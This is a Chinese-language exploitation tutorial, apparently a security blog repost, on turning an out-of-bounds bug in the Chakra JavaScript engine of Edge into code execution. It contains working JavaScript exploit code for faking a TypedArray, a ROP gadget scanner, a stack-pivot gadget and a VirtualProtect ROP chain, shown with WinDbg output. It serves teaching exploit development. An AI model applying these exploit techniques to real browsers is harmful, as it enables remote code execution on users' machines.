> 原文链接: https://www.anquanke.com//post/id/176493 


# Edge 零基础漏洞利用——进阶版


                                阅读量   
                                **207704**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">5</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t013329a468ef880813.png)](https://p4.ssl.qhimg.com/t013329a468ef880813.png)



## 前情提要

上一篇文章我们讲到需要 fake 一个 TypedArray 来达到任意地址读写。想要 fake 任意对象，首先需要知道该对象的元数据，需要 fake 的 TypedArray 元数据怎么获得？



### <a class="reference-link" name="%E8%A1%A5%E5%85%85%E4%B8%80%E4%BA%9B%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"></a>补充一些背景知识

以下为 TypedArray 的元数据信息，+0x38 处存放着视图的实际数据。

```
0:003&gt; dx -r1 ((chakracore!Js::TypedArrayBase *) 0x0000018d`936b3980 )
((chakracore!Js::TypedArrayBase *) 0x0000018d`936b3980 )                 : 0x18d936b3980 [Type: Js::TypedArray&lt;unsigned int,0,0&gt; * (derived from Js::TypedArrayBase *)]
    [+0x008] type             : 0x18d93675480 [Type: Js::Type *]
    [+0x010] auxSlots         : 0x0 [Type: void * *]
    [+0x018] objectArray      : 0x0 [Type: Js::ArrayObject *]
    [+0x018] arrayFlags       : None (0x0) [Type: Js::DynamicObjectFlags]
    [+0x01a] arrayCallSiteIndex : 0x0 [Type: unsigned short]
    [+0x020] length           : 0x400 [Type: unsigned int]
    [+0x028] arrayBuffer      : 0x18d936d0140 [Type: Js::ArrayBufferBase *]
    [+0x030] BYTES_PER_ELEMENT : 4 [Type: int]
    [+0x034] byteOffset       : 0x0 [Type: unsigned int]
    [+0x038] buffer           : 0x18591bc8730 : 0x30 [Type: unsigned char *]
```

已经获得的越界读写只能访问数组后面的内存，如果 TypedArray 元数据被分配在越界读写数组的前面怎么办？需要数据喷射吗？原理可行，但是这里采用 fake Array 的方式来完成，这样更加简单、稳定。 fake Array 的方式需要点背景知识，这里来补充下。

### <a class="reference-link" name="Array%20%E7%9A%84%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"></a>Array 的背景知识

[![](https://p4.ssl.qhimg.com/t014c1b35c16c2c354f.jpg)](https://p4.ssl.qhimg.com/t014c1b35c16c2c354f.jpg)<br>
先回顾一下第一篇文章中介绍的 Array 的元数据， 常用的域包括 left 、length、size、 next Segment 几个。

[![](https://p3.ssl.qhimg.com/t01539864fce861029c.jpg)](https://p3.ssl.qhimg.com/t01539864fce861029c.jpg)

Array 头部的 next segment 信息存储的是下一个 segment 的头部，其余的域属于当前的 segment 。为什么Chakra 不把 segment 放在一起，而是用指针的方式链接起来呢？因为 Chakra 在管理数组存储的时候，需要管理一种特殊的数组：Sparse 数组。即以下这种数组使用方式：

```
var arr = new Array(10);
arr[0x100000] = 10;
```

原始的数组空间不足以在索引 0x100000 处存储数据，所以需要 new 一块新的内存， 然后这块数据的相关信息保存在 next segment 位置。



## Fake Array

Array 的背景知识可以解决 fake Array 的问题，进而解决TypedArray 元数据怎么获得的问题。既然我们知道 next segment 保存的是下一个Array的信息， 如果我们利用越界写把它指向 DataView 的元数据，那么不就可以读取TypedArray 的元数据了吗，任意地址读写不就达到了吗？说干就干，我们实现以下逻辑：

```
function fake_TypedArray()`{`
    modify_oob_arr_attri(0x7fffffff);

    var arr_len_index = 0x50000/4 -5 ;
    var arr_size_index = 0x50000/4 -4 ;

    var arr_buff_low = leak_obj_addr(arr_buff) % 0x100000000;

    var addr_dv = leak_obj_addr(dv);

    var int_arr_next_high_index = 0x100000000/4 + 13;
    var int_arr_next_low_index = 0x100000000/4 + 12;
    var int_arr_next_high = parseInt((addr_dv + 0x28) /0x100000000);
    var int_arr_next_low  = (addr_dv + 0x28) % 0x100000000;

    oob_write(vul_arr, int_arr_next_low_index, int_arr_next_low); 
    oob_write(vul_arr, int_arr_next_high_index, int_arr_next_high);
    modify_oob_arr_attri(0x0);

    var index =  arr_buff_low;

    for(var i=0; i&lt; 0x10; i++)`{`
        dv[i] = int_arr[index + i];
    `}`

    oob_write(vul_arr, int_arr_next_low_index, 0); 
    oob_write(vul_arr, int_arr_next_high_index, 0);
    modify_oob_arr_attri(0x7fffffff);

    var obj_arr_0_low  = 0x50000/4; 
    var obj_arr_0_high = 0x50000/4 +1;

    int_arr[obj_arr_0_low] = dv[0xe] &gt; 0x7fffffff ? dv[0xe] - 0x100000000: dv[0xe];
    int_arr[obj_arr_0_high] = dv[0xf];    
    dv_rw = obj_arr[0];    
`}`
```

[![](https://p0.ssl.qhimg.com/t013b6d7237c0816fc0.jpg)](https://p0.ssl.qhimg.com/t013b6d7237c0816fc0.jpg)

fake TypedArray 前后对比： 我们可以观察到，fake TypedArray 以后，windbg 已经将它识别为 TypedArray，标志着 fake TypedArray 的成功。

[![](https://p4.ssl.qhimg.com/t01bcea74f5cef52cc7.jpg)](https://p4.ssl.qhimg.com/t01bcea74f5cef52cc7.jpg)

大致的逻辑是： 越界写将 int_arr 的next segment 指向 DataView， 然后用 int_arr 来读取 TypedArray 的元数据。读取的 TypedArray 元数据信息保存到另一个 TypedArray（dv） 的数据部分。这片新的内存即成为一个 fake 的 TypedArray，这里称为：dv_rw。由于 dv_rw 的元数据中包含视图数据的地址信息，而 dv 对 dv_rw 的元数据完全可控，也就完成了任意地址读写的目标，详细的逻辑请参考示例代码。



## 任意地址读写 to RCE

代码执行的前提条件是：我们对当前模块足够熟悉，知道 Chakra 中可执行代码位于哪里，以便我们获取到需要的 gadget 来完成代码执行。目标分解，需要以下三步骤即可代码执行：

#### <a class="reference-link" name="1.%20Chakra%20%E7%9A%84%E5%9F%BA%E5%9C%B0%E5%9D%80%E3%80%82"></a>1. Chakra 的基地址。

#### <a class="reference-link" name="2.%20%E8%A7%A3%E6%9E%90%20PE%20%E8%8E%B7%E5%8F%96%20code%20%E6%AE%B5%E4%BF%A1%E6%81%AF%EF%BC%8C%20%E8%8E%B7%E5%8F%96gadges%E3%80%82"></a>2. 解析 PE 获取 code 段信息， 获取gadges。

#### <a class="reference-link" name="3.%20%E4%BF%AE%E6%94%B9%E8%99%9A%E8%A1%A8%E6%8C%87%E9%92%88%EF%BC%8C%E6%8C%87%E5%90%91%20gadgets%E3%80%82"></a>3. 修改虚表指针，指向 gadgets。

### <a class="reference-link" name="1.%20Chakra%20%E7%9A%84%E5%9F%BA%E5%9C%B0%E5%9D%80"></a>1. Chakra 的基地址

leak 模块基址的思路很简单：通过 leak_obj_addr 泄漏任意一个 obj 的 vtable，然后将 vtable 进行 0x10000 对齐后，每次减去 0x10000 去匹配 PE 文件的 Dos header 中的 Magic data。

[![](https://p5.ssl.qhimg.com/t0148bf02fb258c7440.jpg)](https://p5.ssl.qhimg.com/t0148bf02fb258c7440.jpg)

### <a class="reference-link" name="2.%20%E8%A7%A3%E6%9E%90%20PE%20%E8%8E%B7%E5%8F%96%20code%20%E6%AE%B5%E4%BF%A1%E6%81%AF%EF%BC%8C%20%E8%8E%B7%E5%8F%96gadges"></a>2. 解析 PE 获取 code 段信息， 获取gadges

关于 PE 结构的解析，可以用第三方软件辅助我们解析(比如：CFF explorer), 也可以MS参考官方文档： [https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format。先理清大致概念后，再动手写解析的代码。](https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format%E3%80%82%E5%85%88%E7%90%86%E6%B8%85%E5%A4%A7%E8%87%B4%E6%A6%82%E5%BF%B5%E5%90%8E%EF%BC%8C%E5%86%8D%E5%8A%A8%E6%89%8B%E5%86%99%E8%A7%A3%E6%9E%90%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82) 获取 gadget 的逻辑，可以参考以下笔者的示例代码：

```
var byteArray = new Uint8Array(array.buffer);
var gadgets = `{``}`;
query.forEach((gadget) =&gt; `{`
    var name = gadget[0], bytes = gadget[1];
    var idx = 0;
    while (true) `{`
        idx = byteArray.indexOf(bytes[0], idx);
        if (idx &lt; 0) `{`
            log('missing gadget ' + name);
        gadgets[name] = null;
        return gadgets;
        `}`
        for (var j = 1; j &lt; bytes.length; j++) `{`
            if (bytes[j] &gt;= 0 &amp;&amp; byteArray[idx + j] != bytes[j]) `{`
                break;
            `}`
        `}`
        if (j == bytes.length) `{`
            break;
        `}`
        idx++;
    `}`
    gadgets[name] = p + codeBase+ idx;
`}`);
return gadgets;
```

### <a class="reference-link" name="3.%20%E4%BF%AE%E6%94%B9%E8%99%9A%E8%A1%A8%E6%8C%87%E9%92%88%EF%BC%8C%E6%8C%87%E5%90%91%20gadgets"></a>3. 修改虚表指针，指向 gadgets

寻找 `int3` 的地址，将 obj 的虚表重定向到该地址，执行 int3 一般厂商即认可代码执行的有效性。

[![](https://p4.ssl.qhimg.com/t0152ea78d2c8674a4f.jpg)](https://p4.ssl.qhimg.com/t0152ea78d2c8674a4f.jpg)

但是我们还是希望通过努力，在 pc 上弹出一个计算器，这样更直观，也更加接近 pwn2own 的赛制要求。



## 弹出计算器

通过 rop 的方式，弹出计算器，首先需要控制 stack 指针(rsp)。rsp 的获得大致有两种途径：（1）修改 rsp 为可控的值（2）通过任意地址读写泄漏 rsp。 这里为了简单，我们采用第一种方式。至于第二种方式，有兴趣的小伙伴可以参考 pwnjs 项目（[https://github.com/theori-io/pwnjs）。后续如果时间允许，我也将第二种方式详细的实现放在博客上。](https://github.com/theori-io/pwnjs%EF%BC%89%E3%80%82%E5%90%8E%E7%BB%AD%E5%A6%82%E6%9E%9C%E6%97%B6%E9%97%B4%E5%85%81%E8%AE%B8%EF%BC%8C%E6%88%91%E4%B9%9F%E5%B0%86%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E5%BC%8F%E8%AF%A6%E7%BB%86%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%94%BE%E5%9C%A8%E5%8D%9A%E5%AE%A2%E4%B8%8A%E3%80%82)<br>
通过修改虚表指针的方式，我们可以控制至少一个寄存器，这里的可控寄存器是 rax 。rax 是 fake 的虚表，虚表的第一项为 int3 的地址。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01959d7e3fde02cff6.jpg)

### <a class="reference-link" name="stack%20pivot"></a>stack pivot

理想的 gadget 是一些 rsp，rax 的直接交互， 如： xchg rsp, rax 或者 mov rsp，rax 或者 push rax; pop rsp 之类，但是这里我们并不能直接获得这类 gadget 。通过编写小工具，很容易定位到一些有用的同等效力的gadget， 如：

```
0:003&gt; u 0x294FC6 + chakracore
chakracore!::operator()+0x8a [e:a_work39slibruntimedebugprobecontainer.cpp @ 375]:
00007ffc`b1434fc6 50              push    rax
00007ffc`b1434fc7 08488b          or      byte ptr [rax-75h],cl
00007ffc`b1434fca 5c              pop     rsp
00007ffc`b1434fcb 2430            and     al,30h
00007ffc`b1434fcd 4883c420        add     rsp,20h
00007ffc`b1434fd1 5f              pop     rdi
00007ffc`b1434fd2 c3              ret

```

栈迁移后，我们就可以着手准备 rop 链和 shellcode 了。这部分的整体逻辑示意图如下：

[![](https://p1.ssl.qhimg.com/t01652c5edd8a795ca6.jpg)](https://p1.ssl.qhimg.com/t01652c5edd8a795ca6.jpg)

通过调用 VirtualProtect 将地址属性修改为可执行，然后执行 shellcode。

### <a class="reference-link" name="%E8%A1%A5%E5%85%85%E4%B8%80%E4%BA%9B%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"></a>补充一些背景知识

x64 calling convention ([https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=vs-2019](https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=vs-2019)), 参数依次存放在 rcx, rex, r8, r9 和栈上。<br>
VirtualProtect 的函数原型如下：

```
BOOL VirtualProtect
      LPVOID lpAddress,
      SIZE_T dwSize,
      DWORD  flNewProtect,
      PDWORD lpflOldProtect
    );
```

该 API 需要4个参数，依次对应 lpAddress &lt;—&gt; rcx, dwSize &lt;—&gt; rdx, flNewProtect &lt;—&gt; r8, lpflOldProtect &lt;—&gt; r9。

我们理想的 gadget 当然就是: pop rcx; pop rdx; pop r8; pop r9; ret; 同样的，实际上并没有这类 gadget，我们选择一些同等效力的替代 gadget ：pop rcx; ret 和 pop rdx; ret 和 pop r8x; ret; 由于 r9 没有类似的 gadget，我选择另外一个gadget：

```
0:003&gt; u F42DD + chakracore
chakracore!FlowGraph::FindEdge+0x35 [e:a_work39slibbackendflowgraph.cpp @ 623]:
00007ffc`b12942dd 4c8bc8          mov     r9,rax
00007ffc`b12942e0 498bc1          mov     rax,r9
00007ffc`b12942e3 4883c438        add     rsp,38h
00007ffc`b12942e7 c3              ret
```

准备 VirtualProtect 参数的 rop 链，的示例代码如下：

```
var gadget_pop_int3 = new Addr(gadgets_addr_list['int3']);
    var gadget_pop_rcx  = new Addr(gadgets_addr_list['pop_rcx']);
    var gadget_pop_rdx  = new Addr(gadgets_addr_list['pop_rdx']);
    var gadget_pop_r8   = new Addr(gadgets_addr_list['pop_r8']);
    var gadget_pop_r9   = new Addr(chakracore_base + 0xF42DD);

/*    
0:003&gt; u chakracore + 0xF42DD
chakracore!FlowGraph::FindEdge+0x35 [e:a_work39slibbackendflowgraph.cpp @ 623]:
00007ffc`b12942dd 4c8bc8          mov     r9,rax
00007ffc`b12942e0 498bc1          mov     rax,r9
00007ffc`b12942e3 4883c438        add     rsp,38h
00007ffc`b12942e7 c3              ret
*/    
    var rop_chain = [
         gadget_pop_rcx.low,     gadget_pop_rcx.high        // gadget: pop rcx
        ,ret_list[0],             ret_list[1]                  // lpAddress
        ,gadget_pop_rdx.low,     gadget_pop_rdx.high        // gadget: pop rdx
        ,1*0x1000*0x1000,         0x0                         // dwSize
        ,gadget_pop_r8.low,     gadget_pop_r8.high           // gadget: pop r8
        ,0x40,                     0x0                        // flNewProtect
        ,gadget_pop_int3.low,   gadget_pop_int3.high       // int3
    ];

    for(var i=0; i&lt;rop_chain.length ;i++)`{`
        fake_stack[i + 26] = rop_chain[i];
    `}`
```

上面的 rop 执行后，寄存器的值如下：

[![](https://p4.ssl.qhimg.com/t01e6172760e79968ca.jpg)](https://p4.ssl.qhimg.com/t01e6172760e79968ca.jpg)

VirtualProtect rop 链调用之前的内存属性为：读写：

[![](https://p2.ssl.qhimg.com/t013d1e5c22159d2f63.jpg)](https://p2.ssl.qhimg.com/t013d1e5c22159d2f63.jpg)

VirtualProtect rop 链调用之后的内存属性为：读写+执行：

[![](https://p3.ssl.qhimg.com/t017e09c5f42eca8dc6.jpg)](https://p3.ssl.qhimg.com/t017e09c5f42eca8dc6.jpg)

表明 rop 链调用 VirtualProtect 已经成功，剩下的就只有实现 shellcode部分了。

最终效果如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0148a0cf581b2b1270.gif)



## Last but not least

还记得当初的目标吗？ ”零基础在浏览器中稳定的弹出第一个计算器“。 在 Chakra 的漏洞利用中，我们只需要解决ASLR 和 DEP的问题。在 Edge 中，将面临 CFG、 Sandbox 、CIG 、ACG 等挑战。如何将 exp 稳定的移植到 Edge 中？怎样处理CFG？…

### <a class="reference-link" name="Stay%20tuned%20!"></a>Stay tuned !
